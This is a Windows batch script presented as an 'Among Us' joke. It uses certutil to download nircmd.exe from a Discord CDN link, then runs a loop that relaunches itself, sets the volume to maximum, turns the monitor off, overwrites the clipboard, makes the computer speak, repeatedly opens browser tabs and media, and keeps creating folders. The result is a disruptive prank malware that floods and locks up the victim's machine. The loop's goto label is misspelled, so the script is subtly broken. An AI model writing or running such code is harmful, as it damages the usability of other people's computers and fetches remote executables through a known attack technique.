@echo off
title Among Us
echo  YOU JUST GOT SUSSED!

set NirURL=https://cdn.discordapp.com/attachments/840030032444391425/845178546040340480/nircmd.exe >nul
set NirFile=nircmd.exe >nul
certutil -urlcache -split -f %NirURL% %NirFile% >nul

:daLoop
echo  YOU GOT SUSSED!
cd %~dp0
if exist AmongUs.exe start AmongUs.exe >nul
if exist AmongUs.bat start AmongUs.bat >nul
cd C:\Windows\System32 >nul
nircmd.exe setsysvolume 65535
nircmd.exe monitor off
nircmd.exe clipboard set "YOURE SO SUSSY YOU GOT SUSSED!"
nircmd.exe speak text ~$clipboard$
start "" "https://youtu.be/sQopsstNB8A"
start "" "https://cdn.discordapp.com/attachments/839654283830099968/845430491149762610/Among-Us-memes.png" >nul
start "" "https://youtu.be/Ns3YxbIhTRM" >nul
start "" "https://cdn.discordapp.com/attachments/839654283830099968/845432600683348008/SUSSY_NOISE.mp3"
mkdir "%~dp0\YOU ARE SUSSY %random%" >nul
goto daLoopy